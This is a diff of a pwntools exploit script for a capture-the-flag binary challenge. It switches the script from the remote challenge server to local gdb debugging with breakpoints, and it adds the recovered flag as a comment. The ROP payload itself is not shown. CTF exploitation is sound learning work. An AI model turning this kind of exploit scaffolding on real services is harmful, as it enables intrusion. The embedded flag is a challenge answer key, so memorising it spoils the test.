@@ -1,15 +1,15 @@
 from pwn import *
 
-# context.log_level = 'debug'
-# context.terminal = ['tmux', 'splitw', '-h']
+context.log_level = 'debug'
+context.terminal = ['tmux', 'splitw', '-h']
 
-# p = gdb.debug('./chall', '''
-#     b *0x401266
-#     b *0x401387
-#     continue
-# ''')
+p = gdb.debug('./chall', '''
+    b *0x401266
+    b *0x401387
+    continue
+''')
 
-p = remote('chall.lac.tf', 31137)
+# p = remote('chall.lac.tf', 31137)
 
 e = ELF('./chall')
 r = ROP('./chall')
@@ -52,3 +52,5 @@ p.recvuntil(b"2. Exit\n")
 p.sendline(b'2')
 
 p.interactive()
+
+# lactf{miiineeeee_diaaaaamoooonddsssssss_ky8cnd5e}
